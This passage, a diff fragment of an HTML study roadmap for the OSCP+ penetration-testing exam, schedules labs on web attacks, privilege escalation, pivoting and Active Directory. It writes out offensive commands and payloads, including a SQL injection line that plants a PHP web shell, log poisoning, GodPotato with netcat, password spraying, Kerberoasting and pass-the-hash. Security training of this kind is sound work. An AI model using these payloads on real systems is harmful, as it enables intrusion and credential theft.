+    <div class="week-goal">Navigate Windows via CMD and PowerShell, understand the Registry and Services, and build your local BadBlood Domain Controller lab.</div>
+    <p><strong>Mon/Wed/Fri:</strong> Complete TryHackMe's <em>Windows Fundamentals 1, 2, and 3</em> and <em>Active Directory Basics</em> rooms. Learn how Users, Groups, Organizational Units (OUs), and Group Policy Objects (GPOs) work.</p>
+    <p><strong>Weekend Lab (Sized for 16 GB Host RAM):</strong> Install your Windows Server 2022 Evaluation VM (allocate 4 GB RAM), promote it to a Domain Controller (`Install-WindowsFeature AD-Domain-Services`), join a Windows 10/11 Evaluation client VM (3–4 GB RAM) to the domain, and run the free <strong>BadBlood</strong> script (`Invoke-BadBlood.ps1`) on the DC so your local domain is populated with thousands of realistic users, groups, SPNs, and ACLs for Week 27.</p>
+    <div class="cmd-block">whoami /all, net user, net localgroup administrators, ipconfig /all, sc.exe query, Get-Process, Get-Service</div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge cyan">Week 6</span><h4>Web Application Basics & Burp Suite Proxy</h4></div>
+    <div class="week-goal">Read raw HTTP requests and responses, understand methods/headers/cookies, and intercept traffic with Burp Suite Community.</div>
+    <div class="theory-box">
+      <div class="theory-box-title">First Principles: HTTP Requests, Headers, and Cookies</div>
+      <p>The web is stateless—every time you click a link, your browser sends a plain-text <strong>HTTP Request</strong> to the server (`GET /profile.php HTTP/1.1` or `POST /login.php HTTP/1.1`). Because HTTP forgets who you are between clicks, the server issues a <strong>Session Cookie</strong> (`Cookie: PHPSESSID=xyz123`) in the HTTP headers. By placing <strong>Burp Suite</strong> between your browser and the server, you can pause any request mid-flight and modify hidden form fields, cookies, or headers before the server sees them.</p>
+    </div>
+    <p><strong>Mon/Wed/Fri:</strong> Complete TryHackMe's <em>How the Web Works</em> and <em>Burp Suite: The Basics</em> rooms, plus PortSwigger Academy's introductory HTTP pages.</p>
+    <p><strong>Weekend:</strong> Deploy <strong>DVWA (Damn Vulnerable Web Application)</strong> locally on Docker (`docker run --rm -it -p 80:80 vulnerables/web-dvwa`), route your browser through Burp Suite (`127.0.0.1:8080`), and practice intercepting and modifying requests in Burp Proxy and Burp Repeater.</p>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge amber">Weeks 7–8</span><h4>Bash & Python Scripting for Penetration Testers</h4></div>
+    <div class="week-goal">Write and modify Bash one-liners and Python scripts so you can fix broken public exploits and automate enumeration.</div>
+    <p><strong>Week 7 (Bash):</strong> Variables, `for` and `while` loops, command substitution `$()`, exit codes `$?`, and string cutting. Rewrite 5 Bandit solutions as automated Bash scripts.</p>
+    <p><strong>Week 8 (Python 3):</strong> Master the `socket` library (raw TCP connections), `requests` library (HTTP GET/POST, custom headers, sessions), and `argparse`. Build two required tools and push them to your private GitHub repo:</p>
+    <ol>
+      <li>A Python TCP port scanner using `socket`.</li>
+      <li>A Python web directory checker using `requests` that reads a wordlist and prints paths returning HTTP 200 or 301/302.</li>
+    </ol>
+    <div class="ref-box">
+      <strong>Reference:</strong> <a href="https://automatetheboringstuff.com/" target="_blank">Automate the Boring Stuff with Python (Free Online)</a>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge purple">Weeks 9–10</span><h4>Guided End-to-End Boxes & Core Mechanics Drill</h4></div>
+    <div class="week-goal">Execute full assessment chains (Scan → Enumerate → Foothold → Stabilize Shell → Transfer Tools → Escalate Privilege) with guided rooms.</div>
+    <p><strong>Week 9:</strong> TryHackMe rooms: <em>Nmap</em>, <em>Vulnversity</em> (Linux web upload + SUID privesc), and <em>Blue</em> (Windows SMB). Drill the Chapter 3 TTY upgrade and File Transfer commands on both boxes.</p>
+    <p><strong>Week 10:</strong> TryHackMe rooms: <em>Metasploit: Introduction</em>, <em>Ice</em>, and <em>Blaster</em>. Install `/usr/share/seclists` on Kali and practice web directory discovery with `gobuster` and `feroxbuster`.</p>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge purple">Week 11</span><h4>First Unguided Boxes (The Standing 2h / 3h Cap Rule Begins)</h4></div>
+    <div class="week-goal">Transition from step-by-step tutorials to independent enumeration.</div>
+    <p><strong>Targets:</strong> Hack The Box <em>Starting Point</em> (Tier 0 & Tier 1 free machines) and TryHackMe free CTF rooms: <em>Simple CTF</em>, <em>Bounty Hacker</em>, <em>Pickle Rick</em>, and <em>Kenobi</em>.</p>
+    <div class="callout warning">
+      <div class="callout-title">Enforce the 2-Hour / 3-Hour Rabbit-Hole Cap From Here Onward</div>
+      Starting this week and continuing through Week 48: spend 2 full hours enumerating independently before checking a single hint, and enforce a hard 3-hour stop on any single machine so one stubborn box never derails your weekly schedule.
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge red">Week 12</span><h4>Phase 0 Checkpoint & Buffer Week</h4></div>
+    <div class="week-goal">Verify foundational readiness before starting the 24-week PEN-200 syllabus in Phase 1.</div>
+    <ul class="checklist">
+      <li>Complete 3 new easy boxes (VulnHub or TryHackMe free tier) completely unassisted within the 3-hour cap per box.</li>
+      <li>Write a clean 1-page report for each box in Obsidian explaining the enumeration, foothold, and privilege escalation in plain English.</li>
+      <li><strong>Sunday Brother Quiz (No Notes):</strong> Explain default services on ports 21, 22, 23, 25, 53, 80, 110, 139, 143, 161, 443, 445, 1433, 3306, 3389, 5985. Explain SUID bits, Windows services, and how to stabilize a Linux shell from memory.</li>
+    </ul>
+    <p><em>Built-in Slack: If your brother needs an extra week on Linux, networking, or unguided boxes, repeat Week 11 here before starting Week 13.</em></p>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 6 -->
+<div class="chapter" id="ch6">
+  <div class="phase-banner">
+    <div class="phase-num">Phase 1A</div>
+    <h2>Reconnaissance, Web Attacks & Manual SQLi (Weeks 13–19)</h2>
+    <p>Follows OffSec's official PEN-200 syllabus topic-by-topic using 100% free resources and local VMs. Enforce the 2h hint / 3h hard-stop rule on every weekend box.</p>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge">Weeks 13–14</span><h4>Information Gathering, Service Enumeration & Report Writing</h4></div>
+    <div class="week-goal">PEN-200 Modules: Report Writing, Information Gathering, Vulnerability Scanning.</div>
+    <p><strong>What to Master & Drill:</strong></p>
+    <ul>
+      <li><strong>3-Stage Nmap Routine:</strong> Fast all-ports TCP scan (`-p- --min-rate 3000`), targeted version/script scan (`-p <ports> -sC -sV -O`), and UDP top-ports scan (`-sU --top-ports 100`).</li>
+      <li><strong>Protocol Enumeration:</strong>
+        <ul>
+          <li><strong>DNS (Port 53):</strong> Zone transfers (`dig axfr @$IP domain.local`) and subdomain brute-forcing (`ffuf`).</li>
+          <li><strong>SMB (Ports 139/445):</strong> Null sessions and guest share enumeration using <strong>NetExec (`nxc smb $IP -u '' -p '' --shares`)</strong>, `smbclient -N -L //$IP`, and `enum4linux-ng`.</li>
+          <li><strong>SNMP (UDP 161):</strong> Community string brute-forcing (`onesixtyone`) and walking the process/software MIB trees (`snmpwalk -v2c -c public $IP`).</li>
+          <li><strong>NFS (Port 2049) & SMTP (Port 25):</strong> Listing exported mounts (`showmount -e $IP`) and verifying mail users.</li>
+        </ul>
+      </li>
+      <li><strong>Vulnerability Scanning Theory:</strong> Understand how authenticated vs. unauthenticated scanners work conceptually, while remembering that <strong>automated scanners like Nessus are banned on the OSCP+ exam</strong>.</li>
+    </ul>
+    <p><strong>Deliverable:</strong> Create `01_Port_Enumeration_By_Service.md` in Obsidian containing your exact copy-pasteable commands for every port above, and download OffSec's official OSCP Report Template.</p>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://nmap.org/book/toc.html" target="_blank">Nmap Official Book</a> · <a href="https://book.hacktricks.wiki/" target="_blank">HackTricks Network Services Methodology</a> · OffSec Recording: <em>OSA-PEN-200 Week 1A Active Info Gathering</em>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge green">Weeks 15–18</span><h4>Web Application Attacks & Manual SQL Injection</h4></div>
+    <div class="week-goal">PEN-200 Modules: Intro to Web App Attacks, Common Web App Attacks (Parts 1 & 2), SQL Injection Attacks.</div>
+
+    <div class="theory-box">
+      <div class="theory-box-title">Textbook Concept: Turning Web Flaws into System Shells</div>
+      <p>• <strong>Week 15 (Burp Suite, IDOR & APIs):</strong> Inspecting source code, HTTP headers, verb tampering, and Insecure Direct Object References (changing `/api/user/102` to `/api/user/1` or `/api/admin`).
+      <br>• <strong>Week 16 (Directory Traversal & LFI):</strong> Stepping out of the web root (`../../../../etc/passwd`), using PHP stream wrappers (`php://filter/convert.base64-encode/resource=index.php`) to read backend source code without executing it, and <strong>Log Poisoning</strong> (injecting PHP code inside your `User-Agent` HTTP header and including `/var/log/apache2/access.log` via LFI to gain remote code execution).
+      <br>• <strong>Week 17 (RFI, File Uploads & OS Command Injection):</strong> Bypassing upload filters via alternative executable extensions (`.phtml`, `.phar`, `.aspx`), `Content-Type` header manipulation, and magic bytes (`GIF89a;`), plus direct and blind OS command injection (`;`, `|`, `&&`).
+      <br>• <strong>Week 18 (Manual SQL Injection — Zero `sqlmap`!):</strong> Because `sqlmap` is strictly banned on the OSCP+ exam, you must master manual SQL injection across MySQL, MSSQL, and PostgreSQL: finding column counts with `ORDER BY`, extracting database schemas from `information_schema.tables` via `UNION SELECT`, reading/writing files in MySQL (`LOAD_FILE()`, `INTO OUTFILE`), and enabling `xp_cmdshell` on Microsoft SQL Server (`impacket-mssqlclient`).</p>
+    </div>
+
+    <div class="cmd-block"><span class="comment"># Manual SQL Injection Core Syntax (Drill in PortSwigger Labs!)</span>
+' ORDER BY 1-- -
+' UNION SELECT 1,@@version,user(),database()-- -
+' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns WHERE table_schema=database()-- -
+' UNION SELECT 1,'&lt;?php system($_GET["cmd"]); ?&gt;',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -</div>
+
+    <p><strong>Practice & Deliverable:</strong> Complete every Apprentice and Practitioner lab on <strong>PortSwigger Web Security Academy</strong> for Directory Traversal, File Upload, OS Command Injection, and SQL Injection. Redo 3 labs from each topic 48 hours later with zero hints. Produce `02_Web_Application_Checklist.md`.</p>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://portswigger.net/web-security" target="_blank">PortSwigger Web Security Academy (100% Free)</a> · <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">PortSwigger SQLi Cheat Sheet</a> · OffSec Recordings: <em>OSA-PEN-200 Weeks 2A & 3A Web Attacks</em>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge amber">Week 19</span><h4>Password Attacks, Locating Public Exploits & Fixing Exploits</h4></div>
+    <div class="week-goal">PEN-200 Modules: Password Attacks, Locating Public Exploits, Fixing Exploits.</div>
+    <p><strong>What to Master & Drill:</strong></p>
+    <ul>
+      <li><strong>Network Login Auditing:</strong> Auditing SSH, FTP, RDP, and HTTP POST forms using `Hydra` and Burp Intruder, while avoiding account lockouts.</li>
+      <li><strong>Offline Hash Cracking:</strong> Identifying hash formats (`hashid` and Hashcat's example table) and cracking MD5, Linux SHA-512/yescrypt, Windows NTLM (`-m 1000`), and Net-NTLMv2 (`-m 5600`) using `rockyou.txt` and Hashcat rules (`best64.rule`).</li>
+      <li><strong>Adapting Broken Public Exploits:</strong> Searching offline Exploit-DB (`searchsploit`), reading proof-of-concept source code before execution, fixing hardcoded URLs/ports/shellcode, converting Python 2 scripts to Python 3, and cross-compiling Windows C exploits on Kali (`x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32`).</li>
+    </ul>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">Hashcat Wiki</a> · <a href="https://www.exploit-db.com/searchsploit" target="_blank">SearchSploit Docs</a>
+    </div>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 7 -->
+<div class="chapter" id="ch7">
+  <div class="phase-banner">
+    <div class="phase-num">Phase 1B</div>
+    <h2>Linux & Windows Privilege Escalation (Weeks 20–23)</h2>
+    <p>Initial access is only 10 points. Privilege escalation gives you the second 10 points on standalone boxes and unlocks credential dumping on Active Directory machines. Enforce the 2h/3h cap on all practice boxes.</p>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge cyan">Weeks 20–21</span><h4>Linux Privilege Escalation</h4></div>
+    <div class="week-goal">PEN-200 Module: Linux Privilege Escalation.</div>
+    <ol>
+      <li><strong>Manual Audit First:</strong> Always check `id`, `sudo -l` (check every allowed binary on <strong>GTFOBins</strong>, plus `LD_PRELOAD` / `env_keep`), `/etc/passwd` permissions, history files, and hidden SSH keys before running any automated tool.</li>
+      <li><strong>SUID/SGID & Linux Capabilities:</strong> Locate SUID binaries (`find / -perm -4000 2>/dev/null`) and file capabilities (`getcap -r / 2>/dev/null`) such as `cap_setuid+ep` on Python or Perl.</li>
+      <li><strong>Cron Jobs & Process Monitoring (`pspy64`):</strong> Inspect `/etc/crontab` and `/etc/cron.d/`, then run `pspy64` to watch root processes (UID=0) executing in real time. Look for writable scripts, relative paths (PATH hijacking), or wildcard expansion (`tar *`).</li>
+      <li><strong>Internal Services & Automated Scripts:</strong> Check `ss -tulpn` for services bound to `127.0.0.1` running as root, then run `LinPEAS` (`linpeas.sh`) to verify nothing was missed.</li>
+    </ol>
+    <p><strong>Practice:</strong> Complete TryHackMe's <em>Linux PrivEsc</em> and <em>Linux PrivEsc Arena</em> rooms, then intentionally configure a vulnerable SUID binary, cron job, and sudo rule on your local Linux VM and audit them yourself. Root 2 free Linux boxes on Proving Grounds Play (3-hour cap per box).</p>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> · <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html" target="_blank">HackTricks Linux PrivEsc</a> · OffSec Recordings: <em>OSA-PEN-200 Weeks 4A–6A Privilege Escalation</em>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge cyan">Weeks 22–23</span><h4>Windows Privilege Escalation (Modern Server 2019/2022 Tooling)</h4></div>
+    <div class="week-goal">PEN-200 Module: Windows Privilege Escalation.</div>
+    <ol>
+      <li><strong>Token Privileges (`whoami /priv`):</strong>
+        <ul>
+          <li>If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is Enabled (standard on IIS web shells and SQL service accounts): In addition to understanding legacy Juicy/RoguePotato concepts, drill modern tools that work on Windows 10/11 and Server 2019/2022: <strong>GodPotato</strong> (`GodPotato-NET4.exe -cmd "nc64.exe ..."`) and <strong>PrintSpoofer</strong> (`PrintSpoofer64.exe -i -c powershell.exe`).</li>
+          <li>If `SeBackupPrivilege` is Enabled: Save the `HKLM\SAM` and `HKLM\SYSTEM` registry hives (`reg save HKLM\SAM sam.save`) and extract the local Administrator NTLM hash with `impacket-secretsdump`.</li>
+        </ul>
+      </li>
+      <li><strong>Service Misconfigurations:</strong> Audit Windows services using `WinPEASx64.exe`, `SharpUp.exe`, and native `icacls` / `sc.exe`:
+        <ul>
+          <li><strong>Weak Service Binary Permissions:</strong> Replace the writable `.exe` with a reverse shell binary and restart the service (`sc.exe stop/start`).</li>
+          <li><strong>Weak Service ACLs:</strong> Reconfigure `binPath=` via `sc.exe config`.</li>
+          <li><strong>Unquoted Service Paths</strong> and <strong>DLL Hijacking</strong> (planting a malicious DLL in a writable directory along the Windows DLL search order).</li>
+        </ul>
+      </li>
+      <li><strong>Scheduled Tasks & Stored Credentials:</strong> Inspect PowerShell command history (`ConsoleHost_history.txt`), `Unattend.xml`, `cmdkey /list`, and registry AutoLogon keys. When you find valid credentials for another local or domain user, use <strong>`RunasCs.exe`</strong> (`RunasCs.exe user pass "cmd"`) to execute commands cleanly from a non-interactive web or reverse shell.</li>
+    </ol>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://lolbas-project.github.io/" target="_blank">LOLBAS</a> · <a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" target="_blank">HackTricks Windows PrivEsc</a> · <a href="https://github.com/BeichenDream/GodPotato" target="_blank">GodPotato GitHub</a> · <a href="https://github.com/antonioCoco/RunasCs" target="_blank">RunasCs GitHub</a>
+    </div>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 8 -->
+<div class="chapter" id="ch8">
+  <div class="phase-banner">
+    <div class="phase-num">Phase 1C & 1D</div>
+    <h2>Client-Side, Pivoting, Active Directory & The $19 OffSec Sprint (Weeks 24–35)</h2>
+    <p>Covers the remaining PEN-200 modules (Weeks 24–30), a rest week (Week 31), and a 4-week sprint on Proving Grounds Practice ($19) to test your skills on real OffSec Windows/AD machines before the Gate.</p>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge purple">Weeks 24–26</span><h4>Client-Side Vectors, AV Mechanics, Tunneling/Pivoting & Metasploit</h4></div>
+    <div class="week-goal">PEN-200 Modules: Client-Side Attacks, Antivirus Evasion, Port Redirection & SSH Tunneling, Tunneling Through Deep Packet Inspection, The Metasploit Framework.</div>
+    <p><strong>Week 24 (Client-Side & AV Detection Mechanics):</strong> Study how client-side document vectors work (Microsoft Office VBA macros and Windows `.library-ms` virtual folders pointing to WebDAV shares) and how antivirus engines detect payloads (static byte signatures vs. heuristic analysis vs. dynamic runtime monitoring/AMSI). Test basic payload modifications against your local Windows VM to observe detection behavior.</p>
+    <p><strong>Week 25 (Tunneling, Port Redirection & Ligolo-ng):</strong> Build a 3-VM multi-subnet network in VirtualBox/VMware (Kali → Dual-Homed Pivot Host → Isolated Internal Target). Master both classic SSH tunneling (`ssh -L` local port forward, `ssh -D` dynamic SOCKS proxy, `ssh -R` remote port forward, `chisel`) AND modern TUN interface routing with <strong>Ligolo-ng</strong>:</p>
+    <div class="cmd-block"><span class="comment"># Ligolo-ng Fast Pivoting Workflow (No proxychains slowdown!)</span>
+<span class="comment"># 1. On Kali: Create virtual interface and start proxy server</span>
+sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+<span class="comment"># 2. On Pivot Host: Connect agent back to Kali</span>
+./agent.exe -connect &lt;KALI_IP&gt;:11601 -ignore-cert
+
+<span class="comment"># 3. On Kali: Add internal subnet route (e.g., 172.16.50.0/24) and start tunnel in Ligolo console</span>
+sudo ip route add 172.16.50.0/24 dev ligolo</div>
+    <p><strong>Week 26 (DPI Tunneling & Metasploit):</strong> Understand how Deep Packet Inspection (DPI) firewalls inspect Layer 7 application payloads (and how HTTP/DNS encapsulation works), then complete OffSec's free <strong>Metasploit Unleashed</strong> course (`msfvenom` payload generation, `multi/handler`, and post-exploitation modules—while remembering the 1-machine exam restriction).</p>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://www.offsec.com/metasploit-unleashed/" target="_blank">OffSec Metasploit Unleashed</a> · <a href="https://github.com/nicocha30/ligolo-ng/wiki" target="_blank">Ligolo-ng Wiki</a>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge red">Weeks 27–30</span><h4>Active Directory Mastery (40% of the OSCP+ Exam)</h4></div>
+    <div class="week-goal">PEN-200 Modules: AD Introduction & Enumeration, Attacking AD Authentication, Lateral Movement in AD.</div>
+    <div class="callout danger">
+      <div class="callout-title">Assumed-Breach Exam Alignment & RAM Sizing</div>
+      On the OSCP+ exam, you start the AD set with a valid low-privilege domain username and password. Train that exact starting point against your local <strong>2-VM BadBlood Domain Lab / GOAD-Mini</strong> (if your host has 16 GB RAM) or <strong>GOAD-Light / Full GOAD</strong> (only if your host has 24–32 GB+ RAM).
+    </div>
+
+    <p><strong>Week 27 — Domain Enumeration & BloodHound:</strong> Start from your standard domain user account. Test credentials across all domain machines using <strong>NetExec (`nxc smb/winrm/mssql`)</strong>, enumerate shares and users, and collect domain graph data using `bloodhound-python` (remotely from Kali) or `SharpHound.exe` (from a domain-joined Windows host). In BloodHound, mark your starting user as Owned and analyze shortest paths, group delegations, and ACL permissions (`ForceChangePassword`, `GenericAll`, `GenericWrite`, `WriteDacl`).</p>
+    <p><strong>Week 28 — AD Authentication & Password Spraying:</strong> Understand NTLM challenge-response vs. Kerberos ticket exchanges (KDC, TGT, TGS), where Windows stores credentials in memory and registry (`LSASS`, `SAM`, `LSA Secrets`, `NTDS.dit`), and how to safely spray a discovered password across domain accounts using NetExec (`nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success`).</p>
+    <p><strong>Week 29 — Kerberos & ACL Attacks:</strong> Synchronize your Kali clock with the Domain Controller (`sudo ntpdate $DC_IP`) and practice:
+    <br>• <strong>AS-REP Roasting (`impacket-GetNPUsers`):</strong> Requesting TGTs for accounts with pre-authentication disabled and cracking with Hashcat mode `18200`.
+    <br>• <strong>Kerberoasting (`impacket-GetUserSPNs`):</strong> Requesting service tickets (TGS) for accounts with Service Principal Names (SPNs) and cracking offline with Hashcat mode `13100`.
+    <br>• <strong>Object ACL Abuse (`bloodyAD` / `net rpc`):</strong> Resetting passwords or performing targeted Kerberoasting when your user holds `GenericAll` or `GenericWrite` over another object.
+    <br>• <strong>Silver Tickets & DCSync (`impacket-secretsdump`):</strong> Understanding ticket forging and domain replication abuse.</p>
+    <p><strong>Week 30 — Post-Compromise Dumping & Lateral Movement:</strong> Whenever you gain Administrator/SYSTEM on Machine 1 or Machine 2, dump local SAM hashes, LSA secrets, and LSASS memory (`impacket-secretsdump` or `nxc smb ... --lsa`). Practice moving laterally to the next machine using:
+    <br>• <strong>Pass-the-Hash (`evil-winrm -H`, `impacket-wmiexec -hashes`, `impacket-psexec -hashes`)</strong>
+    <br>• <strong>Overpass-the-Hash / Pass-the-Ticket (`Rubeus.exe`, `export KRB5CCNAME=...`)</strong>
+    <br>• <strong>WMI, WinRM, DCOM, and Volume Shadow Copy (`vssadmin` / `diskshadow`) extraction of `NTDS.dit`.</strong></p>
+
+    <div class="cmd-block"><span class="comment"># Core Assumed-Breach AD Command Sequence</span>
+nxc smb 192.168.50.0/24 -u 'user1' -p 'Pass123' --shares
+bloodhound-python -d corp.local -u 'user1' -p 'Pass123' -ns $DC_IP -c All --zip
+impacket-GetNPUsers corp.local/user1:'Pass123' -dc-ip $DC_IP -request -outputfile asrep.txt
+impacket-GetUserSPNs corp.local/user1:'Pass123' -dc-ip $DC_IP -request -outputfile kerberoast.txt
+impacket-secretsdump corp.local/admin_user:'Pass123'@$TARGET_IP
+evil-winrm -i $TARGET_IP -u Administrator -H &lt;NTLM_HASH&gt;</div>
+
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://www.thehacker.recipes/ad/" target="_blank">The Hacker Recipes (AD)</a> · <a href="https://wadcoms.github.io/" target="_blank">WADComs</a> · <a href="https://github.com/davidprowe/BadBlood" target="_blank">BadBlood GitHub</a> · <a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">GOAD Lab</a>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge green">Week 31</span><h4>Mandatory Rest & Consolidation Week</h4></div>
+    <div class="week-goal">Zero new boxes. OffSec's official 24-week learning plan schedules a rest week after Active Directory—take it to prevent burnout and organize your Obsidian command cheat sheets.</div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge purple">Weeks 32–35</span><h4>The $19 Pre-Gate OffSec Practice Sprint</h4></div>
+    <div class="week-goal">Subscribe to 1 month of Proving Grounds Practice ($19) so you can validate your skills against real OffSec-authored Windows, AD, and Linux machines before committing $1,749 to PEN-200.</div>
+    <div class="callout info">
+      <div class="callout-title">Why We Spend $19 at Week 32 Instead of Waiting Until Week 37</div>
+      Free platforms (PG Play, VulnHub, THM free) have almost no realistic OffSec-authored Windows or Active Directory machines. By subscribing to Proving Grounds Practice ($19) at Week 32, you get 4 weeks of hands-on practice against real OffSec Windows/AD boxes AND can run a true 24-hour blind mock exam in Week 36 before spending $1,749.
+    </div>
+    <ul class="checklist">
+      <li><strong>Weekly Target (Weeks 32–35):</strong> Complete 3 PG Practice machines per week (1 Linux Standalone + 1 Windows Standalone + 1 AD/Domain machine such as `Access`, `Nagoya`, `Hokkaido`, or `Shenzi`) + 1 full local AD chain repetition.</li>
+      <li><strong>Enforce the Standing 2-Hour / 3-Hour Cap:</strong> Maximum 2 hours before checking a single PG hint; hard stop at 3 hours so you never stall out.</li>
+      <li><strong>Reserve 4 Boxes Unseen for Week 36:</strong> Do NOT touch `Hutch`, `Vault`, `Heist`, or `Resourced` during Weeks 32–35—your brother will use those to assemble your blind Week 36 Gate Mock Exam!</li>
+    </ul>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 9 -->
+<div class="chapter" id="ch9">
+  <div class="phase-banner">
+    <div class="phase-num">Week 36 Gate & Phase 2</div>
+    <h2>The 24-Hour Gate Mock & 13-Week Paid Window (Weeks 36–49)</h2>
+    <p>Pass a realistic 24-hour mock exam on unseen OffSec Proving Grounds Practice machines in Week 36 before buying PEN-200. Then execute your 13-week paid sprint.</p>
+  </div>
+
+  <h3>9.1 Week 36: The Financial Gate Test (Includes 24-Hour Blind Mock Exam)</h3>
+  <p>Before purchasing the $1,749 PEN-200 bundle, both brothers must pass all five criteria below:</p>
+  <ul class="checklist">
+    <li><strong>1. The 24-Hour Blind Pre-Purchase Mock Exam:</strong> Have your brother select <strong>4 unseen Proving Grounds Practice machines</strong> for you from the LainKusanagi list: 1 Active Directory / Domain machine (40 pts: e.g., `Resourced`, `Hutch`, `Vault`, or `Heist`), 1 Windows Standalone (20 pts), and 2 Linux Standalones (20 pts each). Run a strict 24-hour timed simulation with zero hints and zero walkthroughs, and score <strong>at least 70/100 points</strong> followed by a full exam report.</li>
+    <li><strong>2. Cumulative Box Count:</strong> Rooted at least 12–15 machines across free sources and PG Practice under the 3-hour cap, with full Obsidian write-ups.</li>
+    <li><strong>3. Local AD Chain Fluency:</strong> Starting from a low-privilege domain user in your local BadBlood / GOAD lab, reached Domain Admin (including a Ligolo-ng pivot) in under 90 minutes from memory.</li>
+    <li><strong>4. Manual Web & SQLi Fluency:</strong> Completed 5 Practitioner-level PortSwigger SQLi and LFI/Upload labs manually with zero `sqlmap`.</li>
+    <li><strong>5. Core Mechanics Muscle Memory:</strong> Can stabilize shells, transfer files across Linux and Windows using 3 protocols, and set up a Ligolo-ng tunnel without looking up basic syntax.</li>
+  </ul>
+  <div class="callout danger">
+    <div class="callout-title">Gate Rule</div>
+    If either brother scores below 70 points on the Week 36 PG Practice Mock Exam, do NOT buy PEN-200 yet. Spend another $19 month on PG Practice drilling the exact category that cost you points, then re-run a new 4-box mock.
+  </div>
+
+  <h3>9.2 Weeks 37–49: The 13-Week Paid Window</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Paid Window Weeks</th><th>Operational Focus</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Paid Weeks 1–3 (Wks 37–39)</strong></td><td>Review official PEN-200 modules and complete all official module lab exercises (~50 hours).</td></tr>
+        <tr><td><strong>Paid Weeks 4–6 (Wks 40–42)</strong></td><td>Complete PEN-200 Challenge Labs: <strong>Medtech</strong>, <strong>Relia</strong>, and <strong>Skylark</strong> (~40 hours), prioritizing the Active Directory sets and pivoting chains.</td></tr>
+        <tr><td><strong>Paid Weeks 7–9 (Wks 43–45)</strong></td><td><strong>Proving Grounds Practice Deep Sprint:</strong> Complete the remaining machines on OffSec's official learning plan and LainKusanagi's OSCP-like list under the 2h/3h cap (see table below).</td></tr>
+        <tr><td><strong>Paid Weeks 10–12 (Wks 46–48)</strong></td><td><strong>OSCP A, B, and C Official Mock Exams:</strong> Run each official multi-machine mock exam as a real 24-hour simulation (Assumed-Breach AD set first, strict Metasploit limit, full proof screenshots) followed by a complete PDF report.</td></tr>
+        <tr><td><strong>Paid Week 13 (Wk 49)</strong></td><td>Patch your weakest category identified during OSCP A/B/C, verify the Go/No-Go checklist (70+ pts on at least 2 of 3 official mocks), rest 48 hours, and sit the OSCP+ exam.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>9.3 Official Learning Plan + LainKusanagi Proving Grounds Practice Boxes</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Category / Syllabus Module</th><th>Official PEN-200 Plan Boxes</th><th>Additional High-Yield PG Practice (LainKusanagi List)</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Active Directory & Domain</strong></td><td><em>PEN-200 AD Labs</em></td><td><code>Access</code>, <code>Resourced</code>, <code>Nagoya</code>, <code>Hokkaido</code>, <code>Hutch</code>, <code>Vault</code>, <code>Heist</code>, <code>Shenzi</code></td></tr>
+        <tr><td><strong>Windows Standalone & PrivEsc</strong></td><td><code>Kevin</code>, <code>Internal</code>, <code>Authby</code>, <code>nickel</code>, <code>slort</code>, <code>Hepet</code>, <code>Splodge</code>, <code>wombo</code></td><td><code>Algernon</code>, <code>Jacko</code>, <code>Craft</code>, <code>Squid</code>, <code>Medjed</code>, <code>DVR4</code>, <code>Mice</code>, <code>Monster</code>, <code>Padlock</code></td></tr>
